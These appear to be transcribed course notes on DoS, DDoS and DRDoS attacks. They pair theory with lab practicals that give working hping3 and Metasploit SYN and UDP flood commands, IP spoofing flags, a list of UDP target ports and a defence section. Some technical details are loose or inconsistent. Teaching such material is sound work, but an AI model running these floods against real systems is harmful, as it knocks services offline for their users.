# Cybersecurity Course — Part 8: DoS, DDoS & DRDoS Attacks (Theory + Practical)

> Source: "NewVersionHacker"

> Topics covered: DoS / DDoS / DRDoS attack theory, attack types (Volumetric / Protocol / Application Layer), practical demonstrations using Metasploit (SYN Flood), Hping3 (SYN Flood, Ping of Death, UDP Flood), IP Spoofing, Wireshark packet analysis, DoS prevention tools and hardware solutions.

---

## Table of Contents

1. [Where DoS Fits in the Ethical Hacking Model](#1-where-dos-fits-in-the-ethical-hacking-model)
2. [DoS Attack — Theory](#2-dos-attack--theory)
   - [2.1 What is a DoS Attack?](#21-what-is-a-dos-attack)
   - [2.2 Core Concept — Capacity Overload](#22-core-concept--capacity-overload)
   - [2.3 Formal Definition & Effects](#23-formal-definition--effects)
3. [DDoS Attack — Distributed Denial of Service](#3-ddos-attack--distributed-denial-of-service)
4. [DRDoS Attack — Distributed Reflection DoS](#4-drdos-attack--distributed-reflection-dos)
5. [Types of DoS Attack Techniques](#5-types-of-dos-attack-techniques)
   - [5.1 Volumetric Attacks](#51-volumetric-attacks)
   - [5.2 Protocol Attacks](#52-protocol-attacks)
   - [5.3 Application Layer Attacks](#53-application-layer-attacks)
6. [IP Spoofing — Concept](#6-ip-spoofing--concept)
7. [Lab Setup for Practicals](#7-lab-setup-for-practicals)
8. [Practical 1 — SYN Flood Attack (Metasploit / MSFConsole)](#8-practical-1--syn-flood-attack-metasploit--msfconsole)
9. [Practical 2 — SYN Flood with Hping3](#9-practical-2--syn-flood-with-hping3)
10. [Practical 3 — Ping of Death (Hping3)](#10-practical-3--ping-of-death-hping3)
11. [Practical 4 — UDP Application Layer Flood (Hping3)](#11-practical-4--udp-application-layer-flood-hping3)
12. [Identifying Open Ports (UDP) with Nmap — Pre-Attack Reconnaissance](#12-identifying-open-ports-udp-with-nmap--pre-attack-reconnaissance)
13. [UDP Attack — Common Target Ports Reference](#13-udp-attack--common-target-ports-reference)
14. [DoS Prevention — Tools & Methods](#14-dos-prevention--tools--methods)
    - [14.1 Software Tools](#141-software-tools)
    - [14.2 Hardware Solutions](#142-hardware-solutions)
15. [Ethical Disclaimer](#15-ethical-disclaimer)
16. [Key Takeaways / Summary](#16-key-takeaways--summary)
17. [Glossary](#17-glossary)
18. [Full Command Reference](#18-full-command-reference)

---

## 1. Where DoS Fits in the Ethical Hacking Model

In the structured ethical hacking methodology followed in this course, **DoS attacks come after Social Engineering** in the attack chain. Understanding DoS is essential because:

- It is one of the most powerful and immediately damaging attack categories.
- It directly disrupts availability — one of the three pillars of information security (**CIA triad**: Confidentiality, Integrity, **Availability**).
- Real-world DoS/DDoS attacks can take down servers, services, and entire networks if no defences are in place.

> **Instructor's note:** "If a DoS attack is performed on a server that has no security measures, no one can save it — it is that powerful."

---

## 2. DoS Attack — Theory

### 2.1 What is a DoS Attack?

**Full form:** **DoS = Denial of Service**

**Where it is used:** Against computers and networks.

**Simple definition:** A DoS attack is an attack that **sends more requests/packets to a target system than it can handle**, overwhelming its processing capacity and causing it to slow down significantly or stop working entirely — effectively **denying legitimate users access** to that system or service.

### 2.2 Core Concept — Capacity Overload

Every server (or any networked computer) has a **maximum request-handling capacity**.

> **Example used by instructor:**
>
> - A server can comfortably handle **10 simultaneous requests**.
> - If you send exactly 10 requests → the server handles them normally.
> - If you send **100 requests at once** → the server becomes overwhelmed, its processing power degrades severely, and it may stop responding entirely.
> - **This act of overwhelming a server beyond its capacity = DoS attack.**

This applies not just to servers but to **any computer on a network** — routers, endpoints, workstations — anything with a finite processing capacity can be overwhelmed.

### 2.3 Formal Definition & Effects

**Definition:** A DoS attack **prevents legitimate users from accessing a computer or network resource** by overloading it with traffic.

**Key effects of a DoS attack:**

| Effect                               | Description                                                                                                                                                                                                |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Access prevention**                | Legitimate users cannot access the system (the system "hangs" or becomes completely unresponsive).                                                                                                         |
| **Traffic overload**                 | Incoming network traffic is flooded far beyond the system's capacity, causing complete saturation.                                                                                                         |
| **System downtime**                  | The targeted system goes "down" — stops responding to all requests, both malicious and legitimate.                                                                                                         |
| **Unauthorized access facilitation** | An attacker may use DoS as a secondary tactic — by downing a system, they may cause its security software (firewall, antivirus, IDS) to restart or malfunction, creating a window for unauthorized access. |
| **Data corruption risk**             | If the attack is sustained, the target machine's data/state can be corrupted from the sustained resource pressure.                                                                                         |

---

## 3. DDoS Attack — Distributed Denial of Service

**Full form:** **DDoS = Distributed Denial of Service**

**Key difference from DoS:** In a standard DoS attack, **one attacker system attacks one target**. In a DDoS attack, the attacker **uses multiple compromised machines simultaneously** to attack one target — multiplying the attack's power massively.

### How a DDoS Attack Works

```
                    ┌──────────────┐
                    │   ATTACKER   │
                    └──────┬───────┘
                           │ Commands
              ┌────────────┼────────────┐
              ▼            ▼            ▼
        ┌──────────┐ ┌──────────┐ ┌──────────┐
        │ Hacked   │ │ Hacked   │ │ Hacked   │
        │ System 1 │ │ System 2 │ │ System 3 │  ← Bots / Zombies
        │ (Bot)    │ │ (Bot)    │ │ (Bot)    │
        └────┬─────┘ └────┬─────┘ └────┬─────┘
             │             │             │
             └─────────────┴─────────────┘
                           │ Simultaneous DoS flood
                           ▼
                    ┌──────────────┐
                    │    TARGET    │
                    │   SERVER     │
                    └──────────────┘
```

**Key terms introduced:**

- **Compromised systems** — machines the attacker has already hacked and taken control of without the owner's knowledge.
- **Bots / Botnets** — the compromised systems acting under the attacker's instructions. "Bot" = robot (follows someone else's commands automatically). A network of bots = **botnet**.
- **Controllers** — intermediate systems (also compromised) that relay the attacker's instructions to the bot network.

> **Why DDoS is more powerful than DoS:** The attack traffic comes from **many different source IPs** simultaneously — making it much harder to block (you can't just block one IP), and the combined request volume far exceeds what any single attacker system could generate alone.

---

## 4. DRDoS Attack — Distributed Reflection DoS

**Full form:** **DRDoS = Distributed Reflection Denial of Service**

**Relationship to DDoS:** DRDoS is essentially a **subtype/variant of DDoS** — the primary difference is in **how** the attack traffic is generated and routed.

**Key distinction:**

- In DDoS, the attacker directly controls compromised machines that flood the target.
- In DRDoS, the attacker uses **third-party servers or services** (often legitimate, publicly available servers) as **unwitting reflectors** — routing the attack traffic through them so that the flood appears to originate from legitimate sources.
- The word "Reflection" = the attack traffic **bounces off** (reflects from) third-party systems before reaching the target.
- These third-party services may be paid/commercial services deliberately weaponized, or legitimate public servers being abused.

> **Summary:** DRDoS = DDoS + using third-party/public servers as traffic amplifiers/reflectors to obfuscate the true attacker and amplify volume.

### Comparison Table — DoS vs DDoS vs DRDoS

| Attribute               | DoS                    | DDoS                      | DRDoS                                  |
| ----------------------- | ---------------------- | ------------------------- | -------------------------------------- |
| **Attack source**       | Single attacker system | Multiple compromised bots | Reflected through third-party servers  |
| **Botnet required**     | No                     | Yes                       | Yes (plus reflector nodes)             |
| **Traffic volume**      | Limited (1 source)     | Very high (many bots)     | Very high + amplified                  |
| **Source traceability** | Easier to trace        | Harder (many IPs)         | Very hard (appears from legit servers) |
| **Complexity**          | Low                    | Medium                    | High                                   |

---

## 5. Types of DoS Attack Techniques

DoS/DDoS attack methods are organised into three broad categories based on which layer/mechanism they exploit:

### 5.1 Volumetric Attacks

**Definition:** Attacks that overwhelm the target by sending an extremely **large volume of packets** at very high speed — saturating the target's bandwidth or processing capacity.

**Subcategories:**

| Attack                      | Description                                                                                                                                                                           |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **UDP Flood**               | Floods the target with a massive number of UDP (User Datagram Protocol) packets, forcing it to process and respond to each one.                                                       |
| **ICMP Flood (Ping Flood)** | Sends a massive number of ICMP Echo Request (ping) packets — the target exhausts resources responding to them.                                                                        |
| **IP Packet Flood**         | Floods the target with malformed or excessive IP packets.                                                                                                                             |
| **Spoofed IP Packet Flood** | Same as IP packet flood but with source IP addresses forged (spoofed) — makes tracing the attacker very difficult.                                                                    |
| **Ping of Death (PoD)**     | Sends oversized/malformed ping packets (beyond the maximum allowed size of 65,535 bytes) — historically caused crashes; modern variant = sending maximum-size packets at high volume. |

> **Common thread:** All volumetric attacks work the same way conceptually — send so many packets so fast that the target's network pipe or CPU becomes completely saturated.

### 5.2 Protocol Attacks

**Definition:** Attacks that exploit specific **network protocol behaviours** to exhaust server resources (particularly state tables and connection handling capacity).

| Attack                    | Description                                                                                                                                                                                                         |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SYN Flood**             | Exploits the TCP three-way handshake. The attacker sends many SYN (Synchronize) packets but never completes the handshake — the server holds half-open connections for each, exhausting its connection state table. |
| **Fragmentation Attack**  | Sends a very high number of fragmented IP packets — the server must reassemble them, consuming resources.                                                                                                           |
| **Spoofed Session Flood** | Creates fake session establishment attempts using spoofed IPs.                                                                                                                                                      |
| **ACK Flood**             | Floods with TCP ACK (Acknowledgment) packets — the server must look up each one in its state table.                                                                                                                 |

> **Why TCP is the primary target for protocol attacks:** TCP uses a **three-way handshake** (SYN → SYN-ACK → ACK) to establish connections. This stateful handshake creates server-side resource consumption for every pending connection — making it exploitable via SYN floods that leave thousands of half-open connections.

### 5.3 Application Layer Attacks

**Definition:** Attacks targeting **specific application-layer services** (HTTP, DNS, etc.) — these are more targeted and can be effective at lower traffic volumes because they exploit how web servers/applications process requests.

| Attack                          | Description                                                                                                                                  |
| ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| **HTTP Flood**                  | Sends a massive number of seemingly legitimate HTTP GET/POST requests to a web server, exhausting it at the application level.               |
| **Slowloris Attack**            | Sends partial HTTP requests very slowly, keeping many connections open simultaneously and starving the server of available connection slots. |
| **UDP Application Layer Flood** | Floods specific UDP-based application ports (NetBIOS, DNS, NTP, etc.).                                                                       |
| **DoS Exploitation Attack**     | Exploits a specific vulnerability in an application to cause it to crash or consume excessive resources.                                     |

---

## 6. IP Spoofing — Concept

IP Spoofing is used across multiple DoS attack techniques to **hide the attacker's real IP address**.

### How IP Spoofing Works

```
  [ATTACKER]         [THIRD PC]          [TARGET]
  IP: 10.10.1.18    IP: 10.10.1.19      IP: 10.10.1.11

  Attacker tampers with the IP table in the network
  and sets the SOURCE IP of outgoing packets
  to 10.10.1.19 (the third PC's IP) instead of its own.

  RESULT: Target sees all malicious traffic as
  coming from 10.10.1.19 — the attacker's real IP
  (10.10.1.18) is never exposed in the attack traffic.
```

**How it's done in practice:** By modifying the source IP field in outgoing packets — the `--spoof` / `-a` flag in tools like Hping3 allows the attacker to specify any IP as the fake source address.

**Verification with Wireshark:** When Wireshark is running on the target during the attack, the source IP shown in packet captures will be the **spoofed IP (e.g., 10.10.1.19)**, not the attacker's real IP (10.10.1.18) — confirming the spoof is working.

---

## 7. Lab Setup for Practicals

| Machine            | Role                         | IP Address (example) |
| ------------------ | ---------------------------- | -------------------- |
| **Kali Linux**     | Attacker machine             | `10.10.1.18`         |
| **Windows 11**     | Primary target machine       | `10.10.1.11`         |
| **Third VM (any)** | Spoofed identity (source IP) | `10.10.1.19`         |

**Tools used (pre-installed on Kali Linux and Parrot OS):**

- `netdiscover` — host discovery / finding target IPs.
- `nmap` — port scanning / service detection.
- `msfconsole` (Metasploit Framework) — used for the SYN flood module.
- `hping3` — flexible packet crafting tool used for multiple attack types.
- **Wireshark** — installed on the target (Windows 11) to observe incoming attack packets.

**Pre-attack reconnaissance (always performed first):**

```bash
# Step 1: Discover all hosts in the lab network range
netdiscover -i eth0 -r 10.10.10.0/24

# Step 2: Identify open ports on the target
nmap -p 21 10.10.1.11       # Check if FTP (port 21) is open
nmap -p 22 10.10.1.11       # Check if SSH (port 22) is open
```

**Reading netdiscover results:**

- The **first IP** in results is always the virtual router/switch.
- The **second IP** (`x.x.x.1` or `x.x.x.2`) is the default gateway.
- Remaining IPs are the lab VMs — identify the target by process of elimination or by cross-referencing known IPs from `ifconfig`/`ipconfig` on each machine.

---

## 8. Practical 1 — SYN Flood Attack (Metasploit / MSFConsole)

**Attack type:** Protocol Attack — TCP SYN Flood
**Tool:** Metasploit Framework (`msfconsole`)
**Attacker:** Kali Linux
**Target:** Windows 11 (port 21 — FTP)

### Step-by-Step

**Step 1 — Open Metasploit:**

```bash
msfconsole
```

> Metasploit opens with a graphic/banner design — this is normal. Any "error"-looking messages in the banner are part of the startup display, not real errors.

**Step 2 — Load the DoS/TCP SYN Flood module:**

```bash
use auxiliary/dos/tcp/synflood
```

**Step 3 — View required options:**

```bash
show options
```

Output shows required fields:

- `RHOSTS` — Remote host (target IP).
- `RPORT` — Remote port (target port).
- `SHOST` — Spoof host (fake source IP to send as).

**Step 4 — Configure the module:**

```bash
set RHOSTS 10.10.1.11        # Target IP (Windows 11)
set RPORT 21                 # Target port (FTP - confirmed open via nmap)
set SHOST 10.10.1.19         # Spoofed source IP (third machine's IP)
```

**Step 5 — Launch the attack:**

```bash
exploit
# OR
run
```

**Step 6 — Observe the attack:**

- On the **target (Windows 11)**: open **Wireshark** on the network adapter (`Ethernet0` or `eth0`).
  - Observe: massive incoming SYN packets from IP `10.10.1.19` (the spoofed IP — not Kali's real IP).
  - Open **Task Manager** → CPU usage climbs to **~100%**.
- The attacker's real IP (`10.10.1.18`) does **not** appear in Wireshark captures — spoofing confirmed.

**Step 7 — Stop the attack:**

```bash
Ctrl + C
```

After stopping: observe CPU usage on the target dropping back to 3–4% — demonstrating the direct causal link between the attack and the CPU load.

---

## 9. Practical 2 — SYN Flood with Hping3

**Attack type:** Protocol Attack — TCP SYN Flood
**Tool:** `hping3`
**Target:** Windows 11 (port 22 — SSH)
**Key difference from Practical 1:** Uses a different tool and targets a different port — demonstrates that the attack principle is the same regardless of tool or port, as long as the port uses TCP.

### Verifying Port 22 (SSH) is Open

```bash
sudo su            # Elevate to root
nmap -p 22 10.10.1.11   # Confirm SSH port 22 is open on target
```

Result: Port 22 shows **open** (SSH — uses TCP → vulnerable to SYN flood).

### Hping3 SYN Flood Command

```bash
hping3 -S -p 22 -a 10.10.1.19 --flood 10.10.1.11
```

**Flag breakdown:**

| Flag            | Meaning                                                                                                   |
| --------------- | --------------------------------------------------------------------------------------------------------- |
| `-S`            | Set the **SYN flag** in outgoing TCP packets (capital S).                                                 |
| `-p 22`         | **Target port** — SSH (port 22).                                                                          |
| `-a 10.10.1.19` | **Spoof source IP** — outgoing packets will appear to come from `10.10.1.19` instead of the real Kali IP. |
| `--flood`       | Send packets as fast as possible — maximum flood rate.                                                    |
| `10.10.1.11`    | **Target IP** (Windows 11).                                                                               |

### Observing the Attack

- **Wireshark on target:** Shows massive incoming TCP SYN packets — source shows `10.10.1.19` (spoofed), not Kali's real IP.
- **Task Manager on target:** CPU spikes to **100%**.
- The instructor notes that with **3–4 machines attacking simultaneously**, the target would completely stop working.

**Stop the attack:**

```bash
Ctrl + C
```

---

## 10. Practical 3 — Ping of Death (Hping3)

**Attack type:** Volumetric Attack — Oversized ICMP/TCP packets
**Tool:** `hping3`
**Key difference:** Allows the attacker to **control the exact packet data size** being sent — sending maximum-size packets at flood rate.

### Hping3 Ping of Death Command

```bash
hping3 -d 65396 -S -p 21 --flood 10.10.1.11
```

**Flag breakdown:**

| Flag         | Meaning                                                                                                |
| ------------ | ------------------------------------------------------------------------------------------------------ |
| `-d 65396`   | **Data size** — sets each packet's data payload to 65,396 bytes (near the maximum TCP/IP packet size). |
| `-S`         | Set the **SYN flag**.                                                                                  |
| `-p 21`      | **Target port** — FTP (port 21).                                                                       |
| `--flood`    | Send at maximum possible rate.                                                                         |
| `10.10.1.11` | **Target IP** (Windows 11).                                                                            |

> **Note:** No `-a` (spoof) flag is used here — the instructor uses this to demonstrate the difference. In Wireshark on the target, you **will see** Kali's real IP (`10.10.1.18`) in the packet captures instead of a spoofed address — demonstrating the contrast. Confirmed by the instructor: "You will not see 19 IP anywhere, you will get 18."

**Effect observed:**

- Target receives enormous packets at flood rate.
- CPU and network stack are overwhelmed simultaneously (large packets + high volume).
- Even with no ACK being sent back (attacker never completes the handshake), packets accumulate on the target and cannot be cleared quickly.

---

## 11. Practical 4 — UDP Application Layer Flood (Hping3)

**Attack type:** Application Layer / Volumetric — UDP Flood
**Tool:** `hping3`
**Target port:** Port 139 (NetBIOS Session Service — runs on Windows, used for printer sharing and Windows networking services)

### Hping3 UDP Flood Command

```bash
hping3 --udp -p 139 --flood 10.10.1.19
```

**Flag breakdown:**

| Flag            | Meaning                                                                                                   |
| --------------- | --------------------------------------------------------------------------------------------------------- |
| `--udp` or `-2` | **UDP mode** — switch Hping3 from default TCP mode to UDP. Without this flag, Hping3 uses TCP by default. |
| `-p 139`        | **Target port** — NetBIOS Session Service.                                                                |
| `--flood`       | Maximum flood rate.                                                                                       |
| `10.10.1.19`    | **Target IP** (in this demo, the third VM running Windows Server).                                        |

> **Why `--udp` matters:** TCP and UDP are fundamentally different transport protocols. Hping3 defaults to TCP. Specifying `--udp` (or equivalently `-2`) explicitly switches to UDP packet mode, which is required for UDP-based service attacks.

### Running Dual Attack (Two Terminals Simultaneously)

The instructor demonstrates doubling the attack intensity by:

1. Pressing **Ctrl+Shift+C** to copy the command (without stopping the attack — `Ctrl+C` would stop it).
2. Opening a **second Kali terminal**.
3. Pasting with **Ctrl+Shift+V** and pressing Enter — running the same attack from two simultaneous processes.

**Result:** Target CPU reaches **100%** and becomes unresponsive. Mouse cursor barely moves on the target. Opening any application becomes impossible.

**Stop both attacks:**

```bash
Ctrl + C    # in both terminals
```

After stopping: CPU gradually recovers. The instructor demonstrates that repeating the attack twice pushes the system to complete unresponsiveness.

---

## 12. Identifying Open Ports (UDP) with Nmap — Pre-Attack Reconnaissance

Before performing UDP-based attacks, you must verify the target port is actually open in **UDP mode** — because Nmap defaults to TCP scanning.

### Why TCP and UDP Scanning Differ

- **TCP SYN scan (`nmap` default):** Checks if a port responds to a TCP connection attempt.
- **UDP scan (`-sU` flag):** Checks if a port is listening for UDP packets.
- A port that is open for UDP **will appear CLOSED in a TCP scan** — hence you must specifically request a UDP scan.

### UDP Scan Commands

```bash
# Correct: UDP scan (use capital -sU for UDP)
nmap -sU -p 123 10.10.1.11        # Check if NTP (UDP port 123) is open → shows OPEN

# Wrong for UDP: default TCP scan
nmap -p 123 10.10.1.11            # Will show CLOSED even if UDP 123 is open
```

**Confirmed result:** NTP (port 123) shows **open** under UDP scan and **closed** under TCP scan — proving UDP and TCP scans return different results for the same port/service.

---

## 13. UDP Attack — Common Target Ports Reference

The instructor lists common UDP-based services and their port numbers that can be targeted for UDP flood attacks (once confirmed open via `nmap -sU`):

| Port     | Protocol / Service                           | Notes                                |
| -------- | -------------------------------------------- | ------------------------------------ |
| **19**   | CHARGEN (Character Generator)                | Charge — generates test data         |
| **69**   | TFTP (Trivial File Transfer Protocol)        | Simple file transfer                 |
| **123**  | NTP (Network Time Protocol)                  | Time synchronization — Windows/Linux |
| **135**  | RPC (Remote Procedure Call)                  | Windows RPC services                 |
| **137**  | NetBIOS Name Service                         | Windows name resolution              |
| **138**  | NetBIOS Datagram Service                     | Windows name resolution              |
| **139**  | NetBIOS Session Service                      | Windows printer/file sharing         |
| **161**  | SNMP (Simple Network Management Protocol)    | Network device management            |
| **389**  | LDAP (Lightweight Directory Access Protocol) | Directory services                   |
| **1900** | SSDP (Simple Service Discovery Protocol)     | UPnP device discovery                |
| **5060** | SIP (Session Initiation Protocol)            | VoIP communications                  |

> **How to use this list:** Run `nmap -sU -p <port> <target_ip>` for each port before attempting a UDP flood — only flood ports that are confirmed open. Sending packets to a closed UDP port will simply be dropped without effect.

---

## 14. DoS Prevention — Tools & Methods

### 14.1 Software Tools

**Anti DDoS Guardian (Windows):**

- A real-time DoS/DDoS detection and blocking tool for Windows systems.
- Displays all incoming connections with **source IP address, packet count, and speed**.
- Allows **manual IP blocking** — once blocked, that IP's packets are dropped automatically.
- Shows attack traffic visually and color-codes suspicious/blocked IPs (red = blocked).
- The instructor demonstrates:
  1. Running the tool on Windows 11 while two other VMs send UDP floods.
  2. Identifying the attacking IPs from the live connection table.
  3. Clicking **"Block IP"** on the attacking IPs → traffic from those IPs stops immediately.
  4. The tool's "Stop Listening" option disables the monitored port entirely.

**LOIC (Low Orbit Ion Cannon):**

- A Windows-side tool the instructor references for generating DoS attack traffic from Windows machines (used here for testing the Anti DDoS Guardian defence).
- Allows setting a target IP and port, choosing protocol (UDP/TCP), and setting attack speed/lock-on.
- **Ethical note:** This tool is referenced only in the context of lab testing and understanding attack patterns — not for unauthorized use.

### 14.2 Hardware Solutions

The instructor names the following **dedicated hardware-level DoS/DDoS protection systems** used in enterprise/production environments:

| Solution                                 | Type                                                                                                    |
| ---------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| **DDoS Protector**                       | Hardware appliance — sits inline on the network and filters malicious traffic before it reaches servers |
| **A10 Thunder TPS**                      | A10 Networks' Thunder Threat Protection System — high-throughput hardware DDoS mitigation               |
| **Terabit DPS (DDoS Protection System)** | High-capacity hardware designed for ISP-level DDoS protection                                           |

> **Instructor's note:** Modern infrastructure has largely moved to cloud-based and hybrid DDoS mitigation — hardware devices are supplemented or replaced by upstream scrubbing centers (e.g., Cloudflare, Akamai) in many organizations. The concepts of detection, filtering, and rate-limiting remain the same regardless of implementation.

**Additional prevention strategies (implied, consistent with industry practice):**

- **Rate limiting** — limit how many requests any single IP can send per second.
- **Firewall rules** — block known-bad IPs and restrict unexpected inbound traffic patterns.
- **Ingress filtering** — ISPs/routers drop packets with spoofed source IPs before they enter the network.
- **Load balancing** — distribute traffic across multiple servers so no single server is overwhelmed.
- **Anycast diffusion** — distribute attack traffic across a large network of scrubbing nodes.

---

## 15. Ethical Disclaimer

> The instructor explicitly states at the start and end of this session:
> _"This video is only for educational purposes and not for any misuse."_

All attacks demonstrated in this session were performed **exclusively within the isolated lab environment** set up in Parts 4–7 — against VMs the instructor owns and controls. These techniques **must never** be used against any system without explicit written authorization from the system owner. Unauthorized DoS attacks are illegal in virtually every jurisdiction and can result in criminal prosecution.

---

## 16. Key Takeaways / Summary

1. **DoS (Denial of Service)** = overwhelming a target with more requests than it can handle → system becomes inaccessible to legitimate users.
2. **DDoS (Distributed DoS)** = same concept but orchestrated from many compromised systems (bots/botnets) simultaneously, massively amplifying the attack.
3. **DRDoS (Distributed Reflection DoS)** = DDoS variant where attack traffic is reflected/amplified via third-party servers.
4. DoS attack techniques fall into three categories: **Volumetric** (bandwidth saturation), **Protocol** (state table exhaustion), and **Application Layer** (service-specific resource exhaustion).
5. **IP Spoofing** is used in many DoS attacks to hide the attacker's real IP — the `-a` flag in Hping3 or `SHOST` in Metasploit sets the fake source IP.
6. **SYN flood** exploits TCP's three-way handshake — sending SYN packets without ever completing the handshake fills the target's half-open connection table.
7. **Hping3** is an extremely versatile command-line tool for DoS attacks — can craft TCP (`-S`), UDP (`--udp`), and oversized (`-d`) packets with spoofing and flood options.
8. **Always verify ports are open** before attacking — use `nmap -p <port> <ip>` for TCP and `nmap -sU -p <port> <ip>` for UDP.
9. **Wireshark** on the target is the best way to observe attack traffic in real-time — confirms packet type, source IP, and volume.
10. **DoS prevention** ranges from software tools (Anti DDoS Guardian) to enterprise hardware (A10 Thunder TPS) — the core principle is detecting abnormal traffic patterns and blocking the source IPs.

---

## 17. Glossary

| Term                                   | Definition                                                                                                                            |
| -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| **DoS (Denial of Service)**            | An attack that overwhelms a target system with more traffic/requests than it can handle, making it inaccessible.                      |
| **DDoS (Distributed DoS)**             | A DoS attack carried out simultaneously from many compromised systems (botnet).                                                       |
| **DRDoS (Distributed Reflection DoS)** | A DDoS variant where attack traffic is reflected and amplified through third-party servers.                                           |
| **Botnet**                             | A network of compromised computers (bots) controlled by an attacker and used to launch DDoS attacks.                                  |
| **Bot / Zombie**                       | A compromised computer under an attacker's control, used without the owner's knowledge.                                               |
| **IP Spoofing**                        | Forging the source IP address in outgoing packets so the real attacker's IP is hidden.                                                |
| **SYN Flood**                          | A DoS attack that exploits TCP's three-way handshake by sending many SYN packets without completing the handshake.                    |
| **SYN Flag**                           | A TCP control flag (Synchronize) used to initiate a connection — the first step in the TCP three-way handshake.                       |
| **Three-Way Handshake**                | The TCP connection establishment process: SYN → SYN-ACK → ACK.                                                                        |
| **Volumetric Attack**                  | A DoS category that saturates bandwidth/CPU with sheer volume of packets (UDP flood, ICMP flood, etc.).                               |
| **Protocol Attack**                    | A DoS category that exhausts server state tables by exploiting protocol behaviours (SYN flood, ACK flood).                            |
| **Application Layer Attack**           | A DoS category targeting specific application services (HTTP flood, Slowloris, DNS flood).                                            |
| **Ping of Death**                      | A DoS attack sending oversized packets (near/at the 65,535-byte limit) at flood rate to crash or overwhelm a target.                  |
| **UDP Flood**                          | Flooding a target with large numbers of UDP packets — the target exhausts resources responding or processing them.                    |
| **NetBIOS**                            | Windows networking protocol stack used for printer sharing and file services — runs on ports 137, 138, 139.                           |
| **NTP (Network Time Protocol)**        | Protocol managing time synchronization — runs on UDP port 123; usable as a DoS/amplification target.                                  |
| **Hping3**                             | A versatile command-line packet crafting and network scanning/testing tool, commonly used in security testing.                        |
| **MSFConsole**                         | The Metasploit Framework console — a comprehensive penetration testing platform with modules for exploits, scanners, and DoS attacks. |
| **Wireshark**                          | A network protocol analyser / packet capture tool used to inspect network traffic in real time.                                       |
| **Anti DDoS Guardian**                 | A Windows software tool that detects and blocks DoS/DDoS attack traffic in real time.                                                 |

---

## 18. Full Command Reference

```bash
# ─── HOST DISCOVERY ────────────────────────────────────────────────────────────
netdiscover -i eth0 -r 10.10.10.0/24
# Discover all live hosts in the lab subnet

# ─── PORT SCANNING (TCP) ───────────────────────────────────────────────────────
nmap -p 21 10.10.1.11          # Check FTP port 21 (TCP)
nmap -p 22 10.10.1.11          # Check SSH port 22 (TCP)

# ─── PORT SCANNING (UDP) ───────────────────────────────────────────────────────
nmap -sU -p 123 10.10.1.11     # Check NTP port 123 (UDP) — use -sU for UDP scans

# ─── PRACTICAL 1: SYN FLOOD — METASPLOIT ──────────────────────────────────────
msfconsole                                    # Open Metasploit
use auxiliary/dos/tcp/synflood               # Load SYN flood module
show options                                  # View required parameters
set RHOSTS 10.10.1.11                        # Set target IP
set RPORT 21                                  # Set target port (FTP)
set SHOST 10.10.1.19                         # Set spoofed source IP
exploit                                       # Launch attack
# Ctrl+C to stop

# ─── PRACTICAL 2: SYN FLOOD — HPING3 ─────────────────────────────────────────
hping3 -S -p 22 -a 10.10.1.19 --flood 10.10.1.11
# -S        = SYN flag
# -p 22     = target port (SSH)
# -a        = spoof source IP
# --flood   = maximum send rate
# Ctrl+C to stop

# ─── PRACTICAL 3: PING OF DEATH — HPING3 ─────────────────────────────────────
hping3 -d 65396 -S -p 21 --flood 10.10.1.11
# -d 65396  = data payload size in bytes (near maximum)
# -S        = SYN flag
# -p 21     = target port (FTP)
# --flood   = maximum send rate
# (no -a flag = attacker's real IP will appear in traffic)
# Ctrl+C to stop

# ─── PRACTICAL 4: UDP APPLICATION LAYER FLOOD — HPING3 ───────────────────────
hping3 --udp -p 139 --flood 10.10.1.19
# --udp     = UDP mode (without this, default is TCP)
# -p 139    = target port (NetBIOS Session Service)
# --flood   = maximum send rate
# Ctrl+C to stop

# ─── COPY COMMAND WITHOUT STOPPING CURRENT ATTACK ────────────────────────────
Ctrl+Shift+C   # Copy in terminal (NOT Ctrl+C — that stops the attack)
Ctrl+Shift+V   # Paste in new terminal window
```

---

_End of Part 8 transcription notes._
